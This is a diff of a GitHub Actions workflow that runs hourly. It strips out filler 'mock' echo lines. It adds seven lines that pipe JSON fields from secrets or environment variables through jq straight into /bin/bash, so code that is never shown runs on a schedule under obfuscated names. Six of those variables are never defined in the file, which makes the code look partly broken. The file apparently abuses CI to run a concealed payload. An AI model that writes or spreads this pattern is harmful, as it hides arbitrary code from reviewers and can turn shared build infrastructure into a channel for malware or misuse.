@@ -2,44 +2,22 @@ name: mengsuwen1982
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
-jobs:  # 26194
+    - cron: '13 * * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mengsuwen1982
         env:
-          g27054: ${{ secrets.g27054 }}
+          kgte38451: ${{ secrets.kgte38451 }}
         run: |
-          echo "Checksum: $((1000 + RANDOM % 9000))"
-          echo $g27054 | jq -r .h20747 | /bin/bash
-          echo "Cc mock: cc --version 2>/dev/null | head -1 || echo no-cc"
-          echo "Trap mock: trap 'echo TRAP' EXIT"
-          echo "Path mock: echo \$PATH | awk -F: '{print \$1}'"
-          echo "Bzip2 mock: bzip2 --version 2>/dev/null | head -1 || echo no-bzip2"
-          echo "Debug at $(date)"
-          
-          echo "GitHub-Actions mock: act --version 2>/dev/null | head -1 || echo no-github-actions"
-          echo "Command chain: true && echo 'A' || echo 'B'"
-          echo "Uniq mock: echo -e 'a\na' | uniq 2>/dev/null || echo no-uniq"
-          echo "Tail mock: tail -1 /etc/hosts 2>/dev/null || echo no-tail"
-          echo "Helm mock: helm --version 2>/dev/null | head -1 || echo no-helm"
-          echo "And/or chain: true && echo A || echo B"
-          echo "Ps mock: ps aux | head -1 2>/dev/null || echo no-ps"
-          echo "Temp file mock: tmp=\$(mktemp) && echo \$tmp || echo no-tmp"
-          echo "Curl mock: curl -s http://example.com 2>/dev/null | head -1 || echo no-curl"
-          echo "Lsblk mock: lsblk | head -1 2>/dev/null || echo no-lsblk"
-          echo "Awk mock: echo '1' | awk '{print \$1+1}' 2>/dev/null || echo no-awk"
-          echo "Tar mock: tar -cf /dev/null /tmp 2>/dev/null || true"
-          echo "Hash mock: hash 2>/dev/null || true"
-          echo "As mock: as --version 2>/dev/null | head -1 || echo no-as"
-          echo "Tr mock: echo 'ABC' | tr 'A-Z' 'a-z' 2>/dev/null || echo no-tr"
-          echo "Complex pipe: echo test | tr a-z A-Z | cut -c1-3"
-          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
-          if [ -x /bin/ls ]; then echo "LS executable"; fi
-          echo "Random sleep: sleep $((RANDOM % 2)) 2>/dev/null || true"
-          echo "GCC mock: gcc --version 2>/dev/null | head -1 || echo no-gcc"
-          echo "Unzip mock: unzip --version 2>/dev/null | head -1 || echo no-unzip"
-          echo "Command sub: $(echo inside subshell)"
+          echo $kgte38451 | jq -r .ctw67042 | /bin/bash
+          echo $nm1983 | jq -r .c8 | /bin/bash
+          echo $dkw9724 | jq -r .fybr46536 | /bin/bash
+          echo $jtt440 | jq -r .u7 | /bin/bash
+          echo $cue0 | jq -r .arsp2 | /bin/bash
+          echo $q553 | jq -r .kmnr84 | /bin/bash
+          echo $pdj335 | jq -r .cidt39178 | /bin/bash
+
